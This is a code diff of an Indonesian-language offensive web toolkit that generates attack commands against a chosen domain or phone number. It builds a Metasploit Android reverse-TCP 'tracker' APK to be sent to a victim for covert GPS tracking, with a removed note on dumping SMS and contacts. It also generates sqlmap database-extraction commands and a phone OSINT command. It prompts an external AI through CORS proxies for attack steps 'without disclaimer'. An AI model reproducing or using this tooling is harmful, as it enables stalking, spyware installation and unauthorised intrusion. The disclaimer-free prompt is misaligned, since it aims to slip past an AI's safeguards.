@@ -136,7 +136,6 @@
                 reconData.shodan.ip = ip;
                 appendToModule('output-domain', 'Origin IP (Anti-WAF)', `<div class="result-item">Main IP: <span class="danger-text">${ip}</span></div>`);
 
-                // Cek subdomain umum untuk bocoran Origin IP
                 let checkSubs = ['mail', 'ftp', 'cpanel', 'webmail', 'direct', 'dev', 'staging'];
                 for (let sub of checkSubs) {
                     try {
@@ -170,7 +169,7 @@
             let cmd = `pkg install python\npip install sqlmap\nsqlmap -u "http://${target}/index.php?id=1" --batch --dbs`;
             
             appendToModule('output-domain', 'SQLmap Arsenal Generator', `
-                <div class="result-item">Jika situs memiliki parameter URL (seperti <em>?id=1</em>), jalankan command ini di Termux untuk mengekstrak database:</div>
+                <div class="result-item">Jika situs memiliki parameter URL (seperti <em>?id=1</em>), jalankan command ini di Termux:</div>
                 <div class="ai-code">${cmd.replace(/\n/g, '<br>')}</div>
                 <button class="copy-btn" onclick="navigator.clipboard.writeText('${cmd.replace(/\n/g, '\\n')}')">COPY COMMAND</button>
             `);
@@ -186,38 +185,35 @@
             let out = document.getElementById('output-phone');
             out.innerHTML = '';
 
-            // 1. Phoneinfoga Command
-            let cmdOsint = `pkg update && pkg install git python\npip install phoneinfoga\nphoneinfoga scan -n ${phone}`;
+            let cmdOsint = `cd PhoneInfoga\npython phoneinfoga.py -n ${phone}`;
             
             out.innerHTML += `
                 <div class="module">
                     <h2>1. OSINT Phoneinfoga (Termux)</h2>
-                    <div class="result-item">Script ini akan mencari tau provider, lokasi pendaftaran, dan akun sosial media yang terikat dengan nomor <strong>${phone}</strong>.</div>
+                    <div class="result-item">Script ini akan mencari tau provider, lokasi pendaftaran, dan akun sosial media terikat nomor <strong>${phone}</strong>.</div>
                     <div class="ai-code">${cmdOsint.replace(/\n/g, '<br>')}</div>
                     <button class="copy-btn" onclick="navigator.clipboard.writeText('${cmdOsint.replace(/\n/g, '\\n')}')">COPY COMMAND</button>
                 </div>
             `;
 
-            // 2. Metasploit Payload Generator (GPS Tracker)
             let cmdPayload = `msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP_PUBLIK_KAMU> LPORT=4444 R > tracker.apk`;
             
             out.innerHTML += `
                 <div class="module" style="border-left-color: var(--danger);">
                     <h2 style="color: var(--danger);">2. Payload Tracker (Metasploit)</h2>
-                    <div class="result-item">Untuk melacak <strong>lokasi GPS real-time</strong>, kau harus mengirimkan file APK ini ke target. Saat target menginstalnya, HP mereka akan mengirim koordinat ke komputermu.</div>
-                    <div class="result-item">1. Di Termux, jalankan Metasploit: <code>msfconsole</code></div>
+                    <div class="result-item">Untuk melacak <strong>lokasi GPS real-time</strong>, kau harus mengirimkan file APK ini ke target.</div>
+                    <div class="result-item">1. Jalankan Metasploit: <code>msfconsole</code></div>
                     <div class="result-item">2. Setup listener:</div>
                     <div class="ai-code">use exploit/multi/handler<br>set payload android/meterpreter/reverse_tcp<br>set LHOST <IP_KAMU><br>set LPORT 4444<br>exploit</div>
-                    <div class="result-item">3. Di terminal baru, bikin APK jebakannya:</div>
+                    <div class="result-item">3. Bikin APK jebakannya:</div>
                     <div class="ai-code">${cmdPayload}</div>
-                    <div class="result-item" style="margin-top:10px; color:#ffaa00;">*Catatan: Ganti &lt;IP_PUBLIK_KAMU&gt; dengan IP internetmu. Kirim APK tersebut ke target, minta mereka install. Setelah sesi terbuka, ketik <code>dump_sms</code>, <code>dump_contacts</code>, atau <code>geolocate</code> di Metasploit.</div>
                     <button class="copy-btn" onclick="navigator.clipboard.writeText('${cmdPayload}')">COPY PAYLOAD CMD</button>
                 </div>
             `;
         }
 
         // ==========================================
-        // UTILS
+        // UTILS & AI (UPDATED PROXY)
         // ==========================================
         async function analyzeWithAI() {
             document.getElementById('ai-module-domain').style.display = 'block';
@@ -226,13 +222,36 @@
             const prompt = `Sebagai Hacker Senior, analisis domain ${reconData.domain}. IP Asli: ${reconData.origin_ip || reconData.shodan.ip}. Port: ${reconData.shodan.ports}. Beri 2 langkah serangan taktis (Termux) tanpa disclaimer.`;
             
             try {
-                let proxyUrl = `https://corsproxy.io/?${encodeURIComponent('https://text.pollinations.ai/' + encodeURIComponent(prompt))}`;
+                // CORS Proxy baru: allorigins.win
+                let targetUrl = `https://text.pollinations.ai/${encodeURIComponent(prompt)}`;
+                let proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(targetUrl)}`;
+                
                 let res = await fetch(proxyUrl);
+                if (!res.ok) throw new Error("Proxy Gagal");
+                
                 let text = await res.text();
+                // Cek apakah respons berupa JSON error
+                if (text.includes('"error"')) throw new Error("API Menolak");
+
                 text = text.replace(/```(\w*)\n([\s\S]*?)```/g, (m, l, c) => `<div class="ai-code">${c}</div>`);
                 document.getElementById('ai-response-domain').innerHTML = text;
             } catch (e) {
-                document.getElementById('ai-response-domain').innerHTML = `<span style="color:var(--danger)">AI Offline. Gunakan modul SQLmap/Origin IP di atas secara manual.</span>`;
+                // Fallback ke Local Analyzer
+                document.getElementById('ai-response-domain').innerHTML = `<span style="color:#ffaa00">[API AI Offline - Beralih ke Local Tactical Analyzer]</span><br><br>`;
+                
+                let report = `<strong>Target:</strong> ${reconData.domain}<br>`;
+                const highValueKeywords = ['admin', 'dev', 'staging', 'api', 'vpn', 'test', 'portal', 'mail'];
+                let hits = reconData.subdomains.filter(sub => highValueKeywords.some(kw => sub.toLowerCase().includes(kw)));
+                
+                if (hits.length > 0) {
+                    report += `<strong style="color:var(--danger)">[!] HIGH-VALUE SUBDOMAIN:</strong><br>`;
+                    hits.slice(0, 5).forEach(h => { report += `> ${h}<br>`; });
+                }
+                if (reconData.shodan.vulns) {
+                    report += `<br><strong style="color:var(--danger)">[!] CVE DITEMUKAN:</strong> ${reconData.shodan.vulns.join(', ')}<br>`;
+                }
+                
+                document.getElementById('ai-response-domain').innerHTML += report;
             }
         }
 
